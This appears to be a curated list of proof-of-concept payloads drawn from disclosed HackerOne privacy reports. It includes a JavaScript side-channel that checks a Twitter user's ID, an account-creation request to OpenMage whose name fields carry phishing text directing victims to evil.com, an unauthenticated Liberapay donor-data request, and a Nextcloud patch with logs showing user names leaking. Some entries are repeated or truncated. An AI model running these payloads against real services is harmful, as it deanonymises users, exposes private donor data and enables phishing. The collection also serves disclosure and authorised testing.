# Privacy Violations  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#505424](https://hackerone.com/reports/505424)  -  Twitter ID exposure via error-based side-channel attack
*medium, $1,470*

```javascript
var id = 'Your ID'
var script = document.createElement('script');
script.src = `https://developer.twitter.com/api/users/${id}/client-applications.json`;

script.onload = () => console.log('ID match');
script.onerror = e => console.log('ID mismatch');
document.head.appendChild(script);
```

## 2. [#1091957](https://hackerone.com/reports/1091957)  -  Very long names on demo.openmage.org could redirect victim users to malicious url redirects via email contacts.
*medium*

```http
POST /customer/account/createpost/ HTTP/1.1
Host: demo.openmage.org/
Content-Length: 91

Content-Disposition: form-data; name="error_url"
```

## 3. [#3878586](https://hackerone.com/reports/3878586)  -  Unauthenticated team "income/payments" export ignores donor privacy settings (hide_giving, hide_from_lists) and uses frozen visibility, exposing donat
*medium, $100*

```http
GET https://liberapay.com/GIMP/income/payments.json HTTP/2
Host: liberapay.com
```

## 4. [#508490](https://hackerone.com/reports/508490)  -  Nextcloud domain and name of every user leaked to lookup server
*medium*

```patch
diff --git a/settings/BackgroundJobs/VerifyUserData.php b/settings/BackgroundJobs/VerifyUserData.php
index 56ebadff9c..76ed8b5ed3 100644
--- a/settings/BackgroundJobs/VerifyUserData.php
+++ b/settings/BackgroundJobs/VerifyUserData.php
@@ -43,10 +43,10 @@ class VerifyUserData extends Job {
	private $retainJob = true;

	/** @var int max number of attempts to send the request */
-	private $maxTry = 24;
+	private $maxTry = PHP_INT_MAX;

	/** @var int how much time should be between two tries (1 hour) */
-	private $interval = 3600;
+	private $interval = 1;

	/** @var AccountManager */
	private $accountManager;
@@ -203,6 +203,7 @@ class VerifyUserData extends Job {

		// ask lookup-server for user data
		$lookupServerData = $this->queryLookupServer($cloudId);
+		printf('Lookup server response for cloudId=%s: %s' . PHP_EOL, $cloudId, print_r($lookupServerData, true));

		// for some reasons we couldn't read any data from the lookup server, try again later
		if (empty($lookupServerData)) {
```

## 5. [#1091957](https://hackerone.com/reports/1091957)  -  Very long names on demo.openmage.org could redirect victim users to malicious url redirects via email contacts.
*medium*

```http
POST /customer/account/createpost/ HTTP/1.1
Host: demo.openmage.org/
Content-Length: 91

Content-Disposition: form-data; name="error_url"


------WebKitFormBoundaryZaGjL6AhSOgUPeQl
Content-Disposition: form-data; name="form_key"

8aHBFidQJt9At8Ux
------WebKitFormBoundaryZaGjL6AhSOgUPeQl
Content-Disposition: form-data; name="firstname"

hello your account has been deleted permanenty please visit here evil.com your account has been blocked permanenty ,please confrim your verification here evil.com
------WebKitFormBoundaryZaGjL6AhSOgUPeQl
Content-Disposition: form-data; name="lastname"

hello your account has been deleted permanenty please visit here evil.com your account has been blocked permanenty ,please confrim your verification here evil.com
------WebKitFormBoundaryZaGjL6AhSOgUPeQl
Content-Disposition: form-data; name="email"

victim-email@address.com
------WebKitFormBoundaryZaGjL6AhSOgUPeQl
Content-Disposition: form-data; name="password"

memek@123
------WebKitFormBoundaryZaGjL6AhSOgUPeQl
Content-Disposition: form-data; name="confirmation"

memek@123
------WebKitFormBoundaryZaGjL6AhSOgUPeQl--
```

## 6. [#3878586](https://hackerone.com/reports/3878586)  -  Unauthenticated team "income/payments" export ignores donor privacy settings (hide_giving, hide_from_lists) and uses frozen visibility, exposing donat
*medium, $100*

```sql
LEFT JOIN participants payer ON payer.id = pi.payer AND pt.visibility = 3
```

## 7. [#3878586](https://hackerone.com/reports/3878586)  -  Unauthenticated team "income/payments" export ignores donor privacy settings (hide_giving, hide_from_lists) and uses frozen visibility, exposing donat
*medium, $100*

```sql
LEFT JOIN participants payer
       ON payer.id = pi.payer
      AND pt.visibility = 3
      AND payer.hide_giving IS NOT TRUE
      AND payer.hide_from_lists = 0
```

## 8. [#508490](https://hackerone.com/reports/508490)  -  Nextcloud domain and name of every user leaked to lookup server
*medium*

```
Lookup server response for cloudId=admin@pferdeapfel.intranet.struktur.de:8096: Array
(
)

Lookup server response for cloudId=leaked@pferdeapfel.intranet.struktur.de:8096: Array
(
)
```

## 9. [#508490](https://hackerone.com/reports/508490)  -  Nextcloud domain and name of every user leaked to lookup server
*medium*

```sh
$ sudo -u www-data php -f /path/to/nextcloud/cron.php
```
